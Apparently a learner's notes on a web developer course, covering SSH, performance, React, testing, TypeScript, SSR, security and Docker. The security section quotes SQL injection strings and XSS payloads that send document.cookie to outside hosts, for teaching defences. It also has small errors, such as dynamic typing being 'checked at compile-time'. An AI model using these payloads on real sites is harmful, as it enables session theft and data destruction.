# Web Developer Complete: How to become Web Developer and get hired!

#### Table of Contents

- [The Complete Junior to Senior Web Developer Roadmap](#the-complete-junior-to-senior-web-developer-roadmap)
  - [Table of Contents](#table-of-contents)
  - [**Section 2: SSH**](#section-2-ssh)
  - [**Section 3: Performance Part 1**](#section-3-performance-part-1)
  - [**Section 4: React + Redux + Module Bundling**](#section-4-react--redux--module-bundling)
  - [**Section 5: Performance Part 2**](#section-5-performance-part-2)
  - [**Section 6: Testing**](#section-6-testing)
  - [**Section 7: TypeScript**](#section-7-typescript)
    - [Dynamic vs Static Typing](#dynamic-vs-static-typing)
    - [Do I switch to TypeScript or stick to JavaScript?](#do-i-switch-to-typescript-or-stick-to-javascript)
    - [Weakly vs Strongly Typed](#weakly-vs-strongly-typed)
    - [Static Typing In Javascript](#static-typing-in-javascript)
  - [**Section 8: SPA vs Server Side Rendering**](#section-8-spa-vs-server-side-rendering)
  - [**Section 9: Security**](#section-9-security)
  - [**Section 10: Code Analysis**](#section-10-code-analysis)
  - [**Section 11: Docker**](#section-11-docker)
    - [Docker Containers](#docker-containers)
    - [Dockerfile](#dockerfile)
    - [Docker Commands](#docker-commands)
    - [Docker Compose](#docker-compose)
    - [PostgreSQL With Docker](#postgresql-with-docker)
    - [Docker Networks](#docker-networks)
  - [**Section 12: Redis**](#section-12-redis)
  - [**Section 13: JWT + Sessions**](#section-13-jwt--sessions)
  - [**Section 14: AWS**](#section-14-aws)
  - [**Section 15: Performance Part 3**](#section-15-performance-part-3)
  - [**Section 16: CI/CD**](#section-16-cicd)
  - [**Section 17: Extra Bits**](#section-17-extra-bits)
  - [**Section 20: Bonus: AMA Video!**](#section-20-bonus-ama-video)

## **Section 2: SSH**

- Introduction to SSH
  - HTTP: Hypertext Transfer Protocol
  - FTP: File Transfer Protocol
  - HTTPS: Hypertext Transfer Protocol Secure
  - SSH: Secure Shell Protocol
  - Host: Remote Server (OS: ubuntu)
  - Client: My computer
- SSH Command
  - SSH Command: `ssh {user}@{host}`
  - Connect to host: `ssh root@xx.xx.xx.xx`
  - Install Git: `sudo apt-get install git`
  - Install Node JS: `sudo apt-get install nodejs`
  - Install all dependencies: `apt install npm`
  - Delete all files in folder: `rm -rf dir1`
  - Delete all file: `rm file`
  - Quit host: `exit`
- Saving The Day Through SSH
  - rsync is a utility to transfer files between client and host
  - Example: `rsync -av . root@xx.xx.50xx.xx:~/superawesome.com`
- How SSH Works
  - Symmetric Encryption: use one secret key for both encryption and decryption by both parties
    - Both parties generate the secret key with public shared data using Key Exchange Algorithm
    - Secret key is specified to each SSH session
  - Asymmetric Encryption: use 2 separate secret key for encryption and decryption
    - Both parties generate temporary secret key
    - Difiie Hellman Key Exchange Algorithm
    - Encrpyt data with public key
    - Decrypt data with paired private key
  - Hashing
    - Verify the authentication of the message
    - Hash based Message Authentication codes
  - Passwords Or SSH?
    - Difiie Hellman Key Exchange
    - Arrive at Symmetric Key
    - Make sure of no funny business
    - Authenticate User
- SSH Into A Server:
  - Overview:
    - Generate public/private key pair at client
    - Share public key with host
    - SSH to host with public key at client
    - [How To Set Up SSH Keys](https://www.digitalocean.com/community/tutorials/how-to-set-up-ssh-keys--2)
  - How to setup manually?
    - Client: `cd ~/.ssh`
    - Generate public/private key pair: `ssh-keygen -t rsa -b 4096 -C "test@gmail.com"`
      - Public key: id_rsa_digitalocean.pub
      - Private key: id_rsa_digitalocean
    - Copy public key to clipboard: `pbcopy < ~/.ssh/id_rsa_digitalocean.pub`
    - Host: `ssh root@xx.xx.xx.xx`
    - Show hidden files: `ls -a`
    - Goto SSH folder: `cd .ssh`
    - Open authorized_keys file: `nano authorized_keys`
    - Paste public key: `Command-v`
    - Exit authorized_keys file and save: `Ctrl-x -> Press Y -> Press Enter`
    - Quit host: `exit`
    - Client: `ssh-add ~/.ssh/id_rsa_digitalocean`
      - Add id_rsa_digitalocean private key into the SSH authentication agent for implementing single sign-on with SSH
    - Host: `ssh root@xx.xx.xx.xx`
    - Open authorized_keys file: `nano authorized_keys`
    - Delete key: Place cursor at start of key -> `ctrl-k`
  - How to setup with digital ocean interface?
    - (Top Right Corner) My profile -> (Left SideBar) Settings -> Security Tab -> SSH keys
    - Note: Add the SSH key on the control panel -> create a new server
- [Set Up SSH on Github](https://help.github.com/en/github/authenticating-to-github/connecting-to-github-with-ssh)
  - Client
    - Generate public/private key pair: `ssh-keygen -t rsa -b 4096 -C "xxx@gmail.com"`
    - Add private key to ssh-agent: `ssh-add -K ~/.ssh/id_rsa_github`
    - Copy public key to clipboard:`pbcopy < ~/.ssh/id_rsa_github.pub`
  - Github: Add new public key
    - (Top Right Corner) Settings
    - (Left Sidebar) SSH and GPG keys
    - New SSH Key
    - Ctrl-v
  - Client
    - Test SSH connection: `ssh -T git@github.com`
    - Clone repo with ssh keys: `git clone git@github.com:chesterheng/learn-formik.git`
  - Github: Check SSH key display Last used within the last week — Read/write

**[⬆ back to top](#table-of-contents)**

## **Section 3: Performance Part 1**

- Introduction to Performance Part 1
  - Client make a request to Server
  - Server return HTML
  - Client render HTML and need CSS
  - Client request CSS from Server
  - Client request Assets from Server
  - Client request JS from Server
- Visitor expect site to load within 2 sec
- In order to display website,
  - Frontend: Send GET request to Backend
  - Backend: Receive the request
  - Backend: Retrieve data from database
  - Backend: Process data and return data to Frontend
  - Frontend: Render HTML and data from Backend
- 3 Keys To Performance
  - Improve the Frontend render
  - Transfer of file, network latency
  - Improve the Backend processing
- How to improve?
  - Frontend
    - Critical Render path (Part 1)
    - Optimized Code (Part 2)
    - Progressive Web App (Part 2)
  - Transfer
    - Minimize Files (Part 1)
    - Minimize Delivery (Part 1)
  - Backend
    - CDNs (Part 3)
    - Caching (Part 3)
    - Load Balancing (Part 3)
    - DB Scaling (Part 3)
    - GZIP (Part 3)
- Network Performance
  1. Honey I shrunk the files
  2. The traveling deliveryman
- Honey I shrunk the files
- Minimize Text: HTML, CSS, JS (Revisit in Webpack)
  - [UglifyJS](https://skalman.github.io/UglifyJS-online/)
- Minimize Images
  - JPG: e.g. photograph
    - lot of colors required
    - no transparent background
  - GIF: use for small animation
  - PNG: e.g. logo
    - less colors required
    - transparent background
  - SVG: vector graphic, expand without distortion
- Resources: Image File Formats
  - [Image file formats: when to use each file type](https://99designs.com/blog/tips/image-file-types)
  - [Page Weight Tool](https://pageweight.imgix.com)
  - [GIF, PNG, JPG or SVG. Which One To Use?](https://www.sitepoint.com/gif-png-jpg-which-one-to-use)
- Image Optimizations
  - If you want transparency: use a PNG
  - If you want animations: use a GIF
  - If you want colourful images: use a JPG
  - If you want simple icons, logos, and illustions: use SVGs
  - Reduce PNG with [TinyPNG](https://tinypng.com)
  - Reduce JPG with [JPEG-optimizer](http://jpeg-optimizer.com)
  - Reduce SVG with [Nano](https://vecta.io/nano)
  - Try to choose simple illustrations over highly detailed photographs
  - Always lower JPEG image quality (30 - 60%)
  - Resize image based on size it will be displayed
  - Display different sized images for different backgrounds
    - [Media Queries](https://css-tricks.com/snippets/css/media-queries-for-standard-devices/)
    - [Media Queries Cheat Sheet](https://gist.github.com/bartholomej/8415655)
  - Use CDNs like imigx
  - [Remove image metadata](https://www.verexif.com/en/)
- Exercise: #1 - Media Queries
- The traveling deliveryman
  - Less trips: is CSS framework necessary?
  - Less trips: is JS library necessary?
  - Browser: 2-6 [max currently request](https://stackoverflow.com/questions/985431/max-parallel-http-connections-in-a-browser)
  - Combine all CSS files into one
  - Combine all JS files into one
- Exercise: #2 - Network Optimizations
  - Minimize all text: e.g. [CSS and JS Minifier](https://www.minifier.org/)
  - Minimize images
  - Media Queries
  - Minimize # of files
    ![Before](network-optimizations-before.jpg)
    ![After](network-optimizations-after.jpg)
- Critical Render Path Introduction
  - DOM -> CSSOM -> Render Tree -> Layout -> Paint
  - Client: 1. Request HTML file from server
  - Server: Return HTML file
  - Client: Parse HTML and start to build the DOM
  - Client: Request external resources from server
  - Client: 2. Request CSS file from server
  - Server: Return CSS file
  - Client: Parse CSS and start to build the CSSOM
  - Client: 3 .Request JS file from server
  - Server: Return JS file
  - Client: 4. DOMCOntentLoaded state
  - Client: Read JS file and make changes to the DOM or CSSOM
  - Client: Combine DOM and CSSOM into a render tree
  - Client: Figure out the layout and positioning with the render tree
  - Client: Paint all the pixels on the browser
  - CLient: Request photo when encounter image tag from server
  - Client: Start to download photo in the background
  - Client: Show when downloaded
  - Client: JS modified Render tree due to user trigger events
- Critical Render Path 1
  - HTML: Load style tag in the `<head>`
  - HTML: Load script right before `</body>`
- Critical Render Path 2
  - CSS: Only load whatever is needed
  - CSS: Above the fold loading: load necessary style first
  - CSS: Media Attributes
  - CSS: Less Specificity
- Critical Render Path 3
  - JS: Load Scripts asynchronously
  - JS: Defer Loading of scripts
  - JS: Minimize DOM manipulation
  - JS: Avoid long running JavaScript
  - Resource: [Loading Third-Party JavaScript](https://developers.google.com/web/fundamentals/performance/optimizing-content-efficiency/loading-third-party-javascript)
  - Resource: [Async + Defer](https://stackoverflow.com/questions/10808109/script-tag-async-defer)
- Critical Render Path 4
  - Download HTML -> Construct DOM
  - Download CSS -> Construct CSSOM
  - Download JS -> Modify DOM and CSSOM
  - Construct render tree with DOM and CSSOM
  - Figure layout and positioning from the render tree
  - Paint pixels on the screen
  - Load image in the background and display web page
- Exercise: #3 - Critical Render Path
- Free course: [The Critical Rendering Path](https://www.udacity.com/course/website-performance-optimization--ud884)
- Exercise: #4 - Keiko Corp Website
  - [PageSpeed Insights](https://developers.google.com/speed/pagespeed/insights/)
  - [WebPageTest](https://www.webpagetest.org/)
- Resource Prefetching: [Prefetching, preloading, prebrowsing](https://css-tricks.com/prefetching-preloading-prebrowsing/)
- [Performance Tools](https://www.udemy.com/course/the-complete-junior-to-senior-web-developer-roadmap/learn/lecture/10210456#content)
- [HTTP/2](https://developers.google.com/web/fundamentals/performance/http2/)
- [HTTP/3](https://blog.cloudflare.com/http3-the-past-present-and-future/)

**[⬆ back to top](#table-of-contents)**

## **Section 4: React + Redux + Module Bundling**

- Angular vs React vs Vue (think of Pros and Cons)
- Angular: for large bank with massive codebase
- Angular: a full framework, everyone sticks to the rules
- React: for a company with a strong developer team
- React: need to be flexible and evolve by adding different libraries and tools to the ecosystems
- React: simple way of writing code
- Vue: Super easy to pick up
- Critical Render Path
  - JS Delivery
  - Minimise DOM manipulation with JS
  - Minimise re-rendering
- Why use Redux?
  - Good for managing large state
  - Useful for sharing data between containers
  - Predictable state management using the 3 principles
    - Single source of truth
    - State is read only
    - Changes using pure functions
  - Action -> Reducer -> Redux Store -> Make changes in Components
  - Resources: [Webpack 4 Configurator](http://web.jakoblind.no/webpack-config)

**[⬆ back to top](#table-of-contents)**

## **Section 5: Performance Part 2**

- Code optimization
  - Request JS
  - JS Arrives
  - Compile / Parse / Execute
  - fetch()
  - Content Arrives
  - Compile / Parse / Execute
  - Page Interactive
- Solutions
  - [Ahead-of-time (AOT) compilation](https://angular.io/guide/aot-compiler)
  - Limit animation
- Measurements
  - Time to first meaningful paint
  - Time to interactive
- Code Splitting / Progressive Bootstrapping
  - Min JS required for current page
  - Lazy load for another page when current page is interactive
- Code Splitting Technique
  - [Route-based code splitting](https://reactjs.org/docs/code-splitting.html#route-based-code-splitting)
  - Component based Code Splitting
    - Example: [react-loadable](https://github.com/jamiebuilds/react-loadable)
  - Use React.lazy and Suspense
- React Performance Optimizations
  - http://localhost:3000/?react_perf
  - See react components in performance tab
  - Redux can update any leaf component
  - Update any parent component will update all child components
  - [Why Did You Render](https://github.com/welldone-software/why-did-you-render)
- Optimizing Code Review
  - Only load what's needed:
    - Code Splitting
    - Tree Shaking
  - Avoid blocking main thread
  - Avoid memory leaks
  - Avoid multiple re-rendering
- [Tree Shaking 101](https://developers.google.com/web/fundamentals/performance/optimizing-javascript/tree-shaking/)
- Progressive Web Apps
  - [What Web Can Do Today](https://whatwebcando.today)
  - [Lighthouse](https://developers.google.com/web/tools/lighthouse)
  - [Top PWAs](https://appsco.pe/)
  - [Pokedex](https://pokedex.org/)
  - [Hacker News readers as Progressive Web Apps](https://hnpwa.com/)
- 3 important parts
  - HTTPS
  - App Mainfest
  - Service Worker
- [Progressive Web App checklist](https://web.dev/pwa-checklist/)
- HTTPS
  - [Let's Encrypt](https://letsencrypt.org/)
  - [Cloudflare CDN](https://www.cloudflare.com/)
  - [Github Pages](https://pages.github.com)
- App Mainfest
  - [Viewport Meta Tag](https://developers.google.com/web/tools/lighthouse/audits/has-viewport-meta-tag)
  - [Favicon Generator. For real.](https://realfavicongenerator.net/)
- Service Worker
  - [Is Service Worker Ready?](https://jakearchibald.github.io/isserviceworkerready/)
  - How it work?
    1.  Request to service worker
    2.  Access Cache API (Web API)
    3.  Not available in Cache API
    4.  Request from backend
  - [create-react-pwa](https://github.com/jeffposnick/create-react-pwa/compare/starting-point...pwa)
  - [Introduction to Progressive Web Apps](https://auth0.com/blog/introduction-to-progressive-web-apps-push-notifications-part-3/)
  - [Progressive Tooling](https://progressivetooling.com/)

**[⬆ back to top](#table-of-contents)**

## **Section 6: Testing**

- Types of Tests
  - Unit Tests
  - Integration Tests
  - Automation Tests
- Testing Tools and Framework (BDD)
  - Testing libraries: Jasmine, Jest, Mocha
  - Assertion libraries: Jasmine, Jest, chai
  - Test runner: Jasmine, Jest, Mocha, Karma
    - DOM, Puppeteer, jsdom
  - Mock, Spy and Stub: Jasmine, Jest, Sinon.js
  - Code Coverage: Istanbul, Jest
    - `npm test -- --coverage`
- React Testing
  - Snapshot
  - Enzyme
- Unit Tests
  - Test pure functions
  - Don't test the contract
    - server and database
- Integration Tests
  - cross commmunications between units of code
  - Spy to ensure expect side-effect
  - Stub to mock and modify part of process (mock database call)
- Automation Tests (e2e Tests)
  - Entire process of UI Tests runnning in a browser
  - Simulate user behaviors
  - Hardest to setup (Different platform)
  - Examples: Nightwatch, Web Driver IO, TestCafe, Nightmare, Cypress
- Final Note on Testing
  - Production: App.js, DOM, Puppeteer (headless browser)
  - Development: App.test.js, jsdom
    - Read the test
    - Run the test
    - Output code coverage
- Upcoming API Endpoint
  - [Star Wars API](http://swapi.py4e.com/) or [Star Wars API (clone)](https://swapi.dev/)
  - [Numbers API](http://numbersapi.com/#42)
  - [Chuck Norris API](https://api.chucknorris.io/)
  - [Pokemon API](https://pokeapi.co/)
- [Jest Cheat Sheet](https://github.com/sapegin/jest-cheat-sheet)
- [Enzyme](https://enzymejs.github.io/enzyme/docs/api/)
  - Shallow Render (shallow): render current component only, not parent and child
  - Static Render (render): render current component and child
  - Full Render (mount): render entire dom
- [Nock](https://github.com/nock/nock)
- [SuperTest](https://github.com/visionmedia/supertest)
- [What Test is Best?](https://blog.usejournal.com/lean-testing-or-why-unit-tests-are-worse-than-you-think-b6500139a009)

**[⬆ back to top](#table-of-contents)**

## **Section 7: TypeScript**

### Dynamic vs Static Typing

- [Dynamic vs Static Typing](https://android.jlelse.eu/magic-lies-here-statically-typed-vs-dynamically-typed-languages-d151c7f95e2b)
- Static Typed: variable type is known at compile-time
- Dynamic Typed: variable type is checked at compile-time

|     | Static Typed                     | Dynamic Typed           |
| --- | -------------------------------- | ----------------------- |
| Pro | known at compile-time            | checked during run-time |
| Pro | Auto-complete in IDE             | More flexible           |
| Pro | Less bugs in production          |                         |
| Con | More Complex, more time to learn |                         |
| Con | Testing is still required        |                         |
| Con | Slower development process       |                         |

TypeScript = JavaScript + Type Safe

**[⬆ back to top](#table-of-contents)**

### Do I switch to TypeScript or stick to JavaScript?

Alban Delcourt:typing:  15 hours ago
Well at first it was mandatory for me to use TS, as I had to use Angular...
Then I gradually started to use it everywhere, in a personal library, in a backend node app, as I was also giving the TS training with Zenika ^^
All I can say is that there is still some JS projects, some people doesn't want to use TS. So when you ask if you want to use TS, it really depends of the team you're working with, or who will maintain the project...
If you're all alone, I would say go for it, you will spend a lot of time to think and write your interfaces, but this will save you so much more time later on :slightly_smiling_face:
One thing though, be aware of the TS compiler configuration. One key feature of the compiler is that you can really tune the compiler to be more or less severe regarding your typings. In my opinion, always go for a strict mode.

Valentin Cocaud:scala:  14 hours ago
For me, it's not possible to use Typescript. It has to much "lies" in the types. I mean, it greatly reduces the capicity of Javascript only because the type are wrong/can't be expressed (because of a lack of proper support for all JavaScript's functionalities). And I'm not sure if this will be changed in the future. The way Typescript is designed dosen't really allow to have a fully sound type system. (edited) 

Valentin Cocaud:scala:  14 hours ago
If you want an example of one "lie" : In typescript you can't do console.log(1) && 1 because console.log returns void. Which is just wrong. You CAN do that in javascript. And it has always the expected result. (edited) 

Valentin Cocaud:scala:  14 hours ago
The only way I use Typescript is when I'm writing a library. It allows me to generate the .d.ts files and enable autocompletion for my users. But for me, it's the only advantage :disappointed:

Alban Delcourt:typing:  14 hours ago
I'm sorry @valou but I can't find a use case for this example. If you have a function where you directly know that it returns void, you should not try to test for truthiness. If I ever find myself in one of those cases, I would probably think of a code smell :confused:
And yes you can do that in JavaScript, but I would argue that if you do that, you would be writing misleading code

Valentin Cocaud:scala:  14 hours ago
It's only for debugging purpose of course :slightly_smiling_face: It's a common trick, which I use a lot in React. It allows to log something in place where you have to put an expression

Valentin Cocaud:scala:  14 hours ago
An other example for production code then : You can't use symbol's as key in an object. Which is weird since it's one of the main reasons Symbols exists.

Thibaud Courtoison:thinking_face:  14 hours ago
You could technically do (console.log(1), 1)  :stuck_out_tongue:

Alban Delcourt:typing:  14 hours ago
Well if it's only for debugging, you can still add a // @ts-ignore in order to say, 'shut up, I know what I'm doing' :wink:

Valentin Cocaud:scala:  14 hours ago
Ok, but for symbols ?

Alban Delcourt:typing:  13 hours ago
I don't use JavaScript Symbols so I have no experience regarding Symbols + TS. I would presume that it should be well supported by TypeScript as it is a primitive type, but it's just an assumption ^^

Valentin Cocaud:scala:  13 hours ago
It was my asumption too ^^ But it seems that it's not the case :disappointed:

Valentin Cocaud:scala:  13 hours ago
Generator Function are also badly typed and doesn't allow to use it as a co-function

Hugo Wood  13 hours ago
I think TypeScript is a great tool, in my opinion there are some drawbacks:
it can clash with other tools (frameworks, libs, build tools)
sometimes it's too strict, sometimes it's not strict enough, and both can be frustrating, devs should accept that falling back to JS is OK
the type system is very flexible and sometimes some devs (like me) will catch themselves spending hours trying to craft the perfect type, while the return on investment might not be that great
compilation is slow, especially if the project uses large libs

Valentin Cocaud:scala:  13 hours ago
To complete, I think it really depends on your programation style. If you feat the design of the language, you will enjoy working with it :slightly_smiling_face:
And I also think it depends of what you code. Even if I don't enjoy working with it, I use it on my own OpenSource library, because having cleanly typed public interface is great for users

ohans:house_with_garden:  12 hours ago
you should definitely know Typescript - be comfortable enough to work with it. Lots of large codebases use Typescript

uper Go Team  2 days ago
This is a trick question. TypeScript is a super set of JavaScript? /j
Whats your background in programming? Do you like strict type driven workflows or loose and flexible but sometimes wild approach.
Also depending on what you want to achieve neither might be a better option. For instance something like NextJS is effectively react but does more out the box and introduces restrictions. Restrictions can be good for learning as they limited the damage and the knowledge required to get moving quickly.

Arpan  3 days ago
If you dont know any typescript and this will be your first time using typescript then you will find it annoying at first. You will see yourself spending more time writing the types for your application and fighting the TS compiler. I have seen a lot of people ditch TS just because it made them "lose" time. But imo its a long term investment which really helps alot in bigger applications. Once you are used to the workflow, you are going to love it.

Peter Foti:speech_balloon:  1 day ago
When I first starting learning Typescript, I thought I would love it.  But I have come to find that the problems it solves (like preventing the wrong types from being passed) is not a problem that I ever run into.  Additionally, the additional syntax makes the code much less readable, requiring a lot more mental load to parse visually.  And then you also have to add in the time to compile it. To me, the "cost" of Typescript outweighs the "benefit".

### Weakly vs Strongly Typed

- Strong Typed language: Cannot operate on 2 different types
- Weak Typed language: Type coercion
```javascript
var a = 'hello'
a + 17
```

**[⬆ back to top](#table-of-contents)**

### Static Typing In Javascript

- [Flow](https://flow.org/)
  - Static Type Checker
  - Flow -> Babel -> JS
  - [Create React App](https://flow.org/en/docs/tools/create-react-app/)
- [Elm](https://elm-lang.org/)
- [Reason ML](https://reasonml.github.io/)
- [TypeScript](https://www.typescriptlang.org/)
  - [TypeScript Editor Support](https://github.com/Microsoft/TypeScript/wiki/TypeScript-Editor-Support)
  - `tsc --init`
  - `tsc typescript.ts --watch`
  - [Interface vs Type alias in TypeScript 2.7](https://medium.com/@martin_hotell/interface-vs-type-alias-in-typescript-2-7-2a8f1777af4c)
  - [Typescript: Interfaces vs. Type Aliases](https://www.briangonzalez.org/post/interface-types-vs-type-aliases-typescript)
- [Type Assertion](https://basarat.gitbook.io/typescript/type-system/type-assertion)
- [DefinitelyTyped](https://definitelytyped.org/)
- [Adding TypeScript](https://create-react-app.dev/docs/adding-typescript/)
- Small team: focus on features + unit tests + no time for typescript
- Need to make tough decision

**[⬆ back to top](#table-of-contents)**

## **Section 8: SPA vs Server Side Rendering**

- SPA - Client Side Rendering
  - More JS is send to client on initial request
  - Longer for JS to get send and execute
  - SEO performance
  - Critical Render Path
    - Barebone HTML - Nothing to be rendered
    - Wait for JS to arrive
    - Wait for JS to execute
    - Webpage is loaded
- Server Side Rendering
  - Critical Render Path
    - Server response a fully rendered page initial
    - Wait for JS to arrive
    - Wait for JS to execute
    - Webpage is loaded
- Server Side Rendering React
  - Server: ReactDOMServer.renderToNodeStream()
    - New version. Performance Improvement
  - Server: ReactDOMServer.renderToString()
  - Client: Receive a fully rendered page initial
  - Client: ReactDOM.hydrate()
  - Client: Attached event listeners to the fully rendered page

```
// server.js - ssr
import express from "express";
import React from "react";
import fs from "fs";
import { renderToString } from "react-dom/server";
import App from "/App";

const app = express();
app.use(express.static('/public'));

const robots = JSON.parse(fs.readFileSync('/public/robots.json'));
const RobotfriendsApp = React.createElement(App);
app.get('/', (request, response) => {
  response.render('index', {
    content: renderToString(RobotfriendsApp({ data: robots }))
  })
});
```

- CSR vs SSR Part 2
  - CSR Pros: Rich Interactions, Faster Response and Web Applications
  - CSR Cons: Low SEO potential, Longer initial load
  - SSR Pros: Static Sites, SEO and Initial Page Load
  - SSR Cons: Full Page Reloads, Slower page rendering, # Requests to server
- SSR React Libraries
  - [Gatsby](https://www.gatsbyjs.org/) - Static sites
  - [NEXT.js](https://nextjs.org/) - build dynamic applications
- Client Side Routing: use Link component
- Server Side Routing: use a html tag
- [Server-side vs Client-side Routing](https://medium.com/@wilbo/server-side-vs-client-side-routing-71d710e9227f)
- [Tech tip: How to do hard refresh in Chrome, Firefox and IE?](https://www.getfilecloud.com/blog/2015/03/tech-tip-how-to-do-hard-refresh-in-browsers/#.XqzusxMzZhE)
- Dynamic Apps with Next.js
  - Initial refresh: console.log on server
  - Revisiting the page: console.log on client
- [Deploying Next.js Apps](https://vercel.com/home)
- Updating To Latest Version Of Next.js
  - [Create Next App](https://create-next-app.js.org/)
  - ``npm audit fix --force`
  - `npm update`
  - `npm i next@latest`
- [JavaScript SEO](https://developers.google.com/search/docs/guides/javascript-seo-basics)
  - [prerender](https://prerender.io/)
- [When everything's important, nothing is!](https://aerotwist.com/blog/when-everything-is-important-nothing-is/)
  - SSR example: [React documentation](https://reactjs.org/docs/getting-started.html)
  - Progressive Rendering: Code-spiltting
    - Example: [flipkart](https://www.flipkart.com)
    - Example: [aliexpress](https://www.aliexpress.com)

**[⬆ back to top](#table-of-contents)**

## **Section 9: Security**

- Star of Security

  - Injections
  - 3rd party libraries
  - Logging
  - Https everywhere
  - XSS & CSRF
  - Code secrets
  - Secure headers
  - Access control
  - Data management
  - Don't trust anyone
  - Authentication

- Injections

  - [SQL Injection](https://www.hacksplaining.com/exercises/sql-injection)

    - eg. Add in password field: 'or 1=1--
    - eg. Insert into a new row: '; DROP TABLE users; --
    ```sql
    CREATE TABLE sqlinjection (
        id serial PRIMARY KEY,
        email text UNIQUE NOT NULL
      );

    INSERT INTO sqlinjection (email)
    VALUES (; DROP TABLE sqlinjection; --);
    ```
  - [PostgreSQL](https://www.postgresql.org/download/macosx/)
  - [PostgreSQL GUI tool for macOS](http://www.psequel.com)
  - [Postgres Prefs](https://github.com/MaccaTech/PostgresPrefs)
  - Code injection Exercise: Start Security-server, then security-client
  - Key in `<img src='/' onerror="alert('boom')">`
  - Solution:
    - [Protect against SQL Injection](https://www.hacksplaining.com/prevention/sql-injection)
    - Sanitize input with white and black list
    - Parametrize Queries: Use object relational mapper
    ```
      const sqlSelect = (name, email, id) => {
        if(name === number)
      }
    ```
    - [Knex.js](http://knexjs.org/) or other ORMS
- 3rd party libraries
  - [The Node Security Platform service is shutting down 9/30](https://blog.npmjs.org/post/175511531085/the-node-security-platform-service-is-shutting)
  - [Announcing npm@6](https://medium.com/npm-inc/announcing-npm-6-5d0b1799a905)
    - `npm audit`
  - [Snyk](https://github.com/snyk/snyk)
    - `sudo npm i -g snyk`
    - `snyk auth`
    - `snyk test`
- Logging
  - [Insufficient Logging & Monitoring](https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A10-Insufficient_Logging%252526Monitoring)
  - [winston](https://github.com/winstonjs/winston)
    - advanced console log
  - [morgan](https://github.com/expressjs/morgan)
    - monitor api request
- HTTPS Everywhere - SSL/TLS Certificates
  - [Let's Encrypt](https://letsencrypt.org)
  - [Cloudflare](https://www.cloudflare.com/)
- [XSS](https://www.hacksplaining.com/exercises/xss-stored) & [CSRF](https://www.hacksplaining.com/exercises/csrf)
  - XSS: Cross Side Scripting (use for session hijack)
    - [Cross-site scripting for dummies](https://medium.com/hackernoon/cross-site-scripting-for-dummies-be30f76fad09)
    - Hacker inject malicious code into blog post
    - Malicious Code is run when user visit the blog post
    - Example: `window.location = 'www.zzz.com?cookie=' + document.cookie`
    - Send user cookie to to malicious website www.zzz.com
  - CSRF: Cross Site Request Forgery
    - Client <-> Server <-> Database
    - Client <-> 3rd Party API
    - Users log in to their netbank.com
    - Send them a malicious with the following code in the link
    - Example: `<a href="http://netbank.com/transfer.do?acct=AttackerA&amount=$100">Read more!</a>`
    - Users click the link and send AttackerA \$100
    - Example 2:
    - `fetch('//httpbin.org/post',{method:'POST',body:document.cookie})`
    - Send cookie of the current login website to a malicious site
    - [httpbin.org](https://httpbin.org)
    - Solution: Block in document's Content Security Policy
  - XSS and CSRF Summary
    - Sanitize input
    - No eval()
    - No document.write()
      - Example: `document.write('<script>alert(1)</script>')`
    - [Content Security Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)
    - Secure + HTTPOnly [Cookies](https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies)
      - Secure: Cookies send over https
      - HTTPOnly: Prevents cookies from being accessed by client side scripting
    - [csurf](https://github.com/expressjs/csurf)
- Code Secrets
  - [Environmental Variables](https://create-react-app.dev/docs/adding-custom-environment-variables/)
    - Add into .env. Example: `REACT_APP_API_URL=https://swapi.py4e.com/api`
  - Commit History
    - use .gitignore file to avoid commit secret or password to github
    - [Do NOT commit password to github](https://github.com/search?q=remove+password&type=Commits)
- Secure Headers
  - [helmet](https://helmetjs.github.io/)
  - [HTTP: The Protocol Every Web Developer Must Know - Part 1](https://code.tutsplus.com/tutorials/http-the-protocol-every-web-developer-must-know-part-1--net-31177)
  - [HTTP headers](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers)
  - [HTTP - Header Fields](https://www.tutorialspoint.com/http/http_header_fields.htm)
  - [Helmet](https://github.com/helmetjs/helmet)
- Access Control
  - Principal of least privilege
  - Example: [cors](https://github.com/expressjs/cors)
    - Don't give public access to server
    - Give access to people you trust, add a white list
- Data Management
  - bcrypt, scrypt, Aragon2
  - pgcrypto - encrypt a few columns
  - password storage
  - [How to Store User Passwords and Overcome Security Threats in 2017](https://rangle.io/blog/how-to-store-user-passwords-and-overcome-security-threats-in-2017/)
- Don't Trust Anyone (need to monitor all areas)
  - Client <-> Server <-> Database
  - Client <-> 3rd Party API
  - [ratelimiter](https://github.com/tj/node-ratelimiter)
  - How to prevent bad actors?
    -Authentication
  - Session-Based Authentication
  - Token-Based Authentication
  - Exercise: #4 - Optional [Hacking](https://www.hacksplaining.com/lessons)
  - Resource: [Personal Security](https://watchyourhack.com/)
  - Resource: [OWASP Top Ten](https://owasp.org/www-project-top-ten/)

**[⬆ back to top](#table-of-contents)**

## **Section 10: Code Analysis**

- Setting Up Your Environment
  - Client: smart-brain
  - Server: smart-brain-api
  - Database: PostgreSQL
    - [PSequel GUI](http://www.psequel.com)
  - 3rd Party API: [clarifai](https://www.clarifai.com)
- How To Analyze Code
  - Look at API first: smart-brain-api
    - Folder structure
    - package.json
    - Readme
    - Entry point
    - start from server.js
    - goto each controller
  - Frontend App
    - look at src folder
    - start with index.js
    - goto entry point App.js
    - look at initialState
    - look at event handler
    - look at jsx to figure out the layout
  - See what can be improved?
  - Look at the code in an unemotional way
  - Goal is to integrate into the tech team
  - Do not criticize as you have no idea how decision is made in the past

**[⬆ back to top](#table-of-contents)**

## **Section 11: Docker**

### Docker Containers
- Why did this tool get built?
- Why did people spend time and money creating it with any tools that we use?
- [The Evolution of Linux Containers and Their Future](https://dzone.com/articles/evolution-of-linux-containers-future)
- [Complete Intro to Containers](https://btholt.github.io/complete-intro-to-containers/)
- [Containers vs. Virtual Machines](https://blog.netapp.com/blogs/containers-vs-vms/)
  - Containers: lightweight alternative to virtualization
  - Containers: use host operating system
  - Containers: bundle only their libraries and settings required for your application
  - Host has Container Has Image
  - Environment in the container is isolated from host machine
  - Image: Bundle your application into a standalone package that can live inside of a container
  - Image: the file that describes what the container should do
- [Play with Docker](https://labs.play-with-docker.com/)
- [docker hub](https://hub.docker.com/): similar to npm
- [Installing Docker](https://docs.docker.com/docker-for-mac/install/)
- [The Best Ways to Install Docker for Windows, Mac, and Linux, with Tips](https://www.bretfisher.com/installdocker/)

**[⬆ back to top](#table-of-contents)**

### Dockerfile
